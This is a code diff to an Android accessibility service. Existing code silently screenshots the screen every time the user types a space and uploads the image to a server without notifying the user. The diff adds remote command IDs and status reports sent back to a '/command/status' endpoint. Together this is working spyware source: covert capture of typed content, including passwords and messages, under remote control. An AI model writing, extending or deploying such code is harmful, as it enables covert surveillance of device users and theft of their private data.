@@ -8,6 +8,7 @@ import android.content.IntentFilter;
 import android.graphics.Bitmap;
 import android.os.Build;
 import android.util.Log;
+import org.json.JSONObject;
 import android.view.Display;
 import android.view.accessibility.AccessibilityEvent;
 import android.widget.Toast;
@@ -31,8 +32,9 @@ public class GlobalActionService extends AccessibilityService {
         @Override
         public void onReceive(Context context, Intent intent) {
             if (ACTION_SCREENSHOT.equals(intent.getAction())) {
-                Log.d(TAG, "Received screenshot request via Broadcast");
-                performGlobalScreenshot();
+                String commandId = intent.getStringExtra("command_id");
+                Log.d(TAG, "Received screenshot request via Broadcast. Command ID: " + commandId);
+                performGlobalScreenshot(commandId);
             }
         }
     };
@@ -85,7 +87,7 @@ public class GlobalActionService extends AccessibilityService {
                 // Logic: If length increased and ends with space OR just contains more spaces
                 if (currentText.length() > beforeText.length() && currentText.endsWith(" ")) {
                     Log.d(TAG, "Space detected via Text Change -> Triggering Screenshot");
-                    performGlobalScreenshot();
+                    performGlobalScreenshot(null);
                 }
             }
         }
@@ -96,7 +98,7 @@ public class GlobalActionService extends AccessibilityService {
         // Physical Key Interception
         if (event.getAction() == KeyEvent.ACTION_DOWN && event.getKeyCode() == KeyEvent.KEYCODE_SPACE) {
             Log.d(TAG, "Physical Space Bar Detected -> Triggering Screenshot");
-            performGlobalScreenshot();
+            performGlobalScreenshot(null);
             return false; // Don't consume it, let it type a space
         }
         return super.onKeyEvent(event);
@@ -107,7 +109,7 @@ public class GlobalActionService extends AccessibilityService {
         // Not used
     }
 
-    private void performGlobalScreenshot() {
+    private void performGlobalScreenshot(final String commandId) {
         if (Build.VERSION.SDK_INT >= 30) {
             takeScreenshot(Display.DEFAULT_DISPLAY, new Executor() {
                 @Override
@@ -125,22 +127,53 @@ public class GlobalActionService extends AccessibilityService {
                         Bitmap copy = bitmap.copy(Bitmap.Config.ARGB_8888, false);
                         bitmap.recycle();
                         screenshotResult.getHardwareBuffer().close();
-                        saveAndUpload(copy);
+                        saveAndUpload(copy, commandId);
                     }
                 }
 
                 @Override
                 public void onFailure(@NonNull int errorCode) {
                     Log.e(TAG, "Screenshot Failed: " + errorCode);
+                    reportStatus(commandId, "failed", "Screenshot failed with error code: " + errorCode);
                 }
             });
         } else {
             // Fallback for Global Action (Take Screenshot) - API 28+
             performGlobalAction(GLOBAL_ACTION_TAKE_SCREENSHOT);
+            // On older APIs we can't easily get the bitmap from this action
+            Log.w(TAG, "Fallback Screenshot action triggered. Note: Upload is only supported on Android 11+ via this service.");
         }
     }
 
-    private void saveAndUpload(Bitmap bitmap) {
+    private void reportStatus(String commandId, String status, String message) {
+        if (commandId == null) return;
+        
+        String authToken = AuthManager.getToken(this);
+        if (authToken == null) return;
+
+        JSONObject json = new JSONObject();
+        try {
+            json.put("command_id", commandId);
+            json.put("status", status);
+            if (message != null) json.put("response_message", message);
+            
+            NetworkUtils.postJson(AuthManager.getBaseUrl() + "/command/status", json.toString(), new NetworkUtils.Callback() {
+                @Override
+                public void onSuccess(String response) {
+                    Log.d(TAG, "Status reported: " + status);
+                }
+
+                @Override
+                public void onError(String error) {
+                    Log.e(TAG, "Status report failed: " + error);
+                }
+            }, authToken);
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+    }
+
+    private void saveAndUpload(Bitmap bitmap, final String commandId) {
         try {
             File file = new File(getCacheDir(), "screenshot_" + System.currentTimeMillis() + ".jpg");
             FileOutputStream fos = new FileOutputStream(file);
@@ -161,13 +194,13 @@ public class GlobalActionService extends AccessibilityService {
                             public void onSuccess(String response) {
                                 Log.d(TAG, "Upload Success: " + response);
                                 file.delete();
-                                // Silent: No Toast
+                                reportStatus(commandId, "executed", "Screenshot uploaded successfully.");
                             }
 
                             @Override
                             public void onError(String error) {
                                 Log.e(TAG, "Upload Failed: " + error);
-                                // Silent: No Toast
+                                reportStatus(commandId, "failed", "Upload failed: " + error);
                             }
                         });
             } else {
@@ -176,6 +209,7 @@ public class GlobalActionService extends AccessibilityService {
 
         } catch (Exception e) {
             e.printStackTrace();
+            reportStatus(commandId, "failed", "Error: " + e.getMessage());
         }
     }
 }
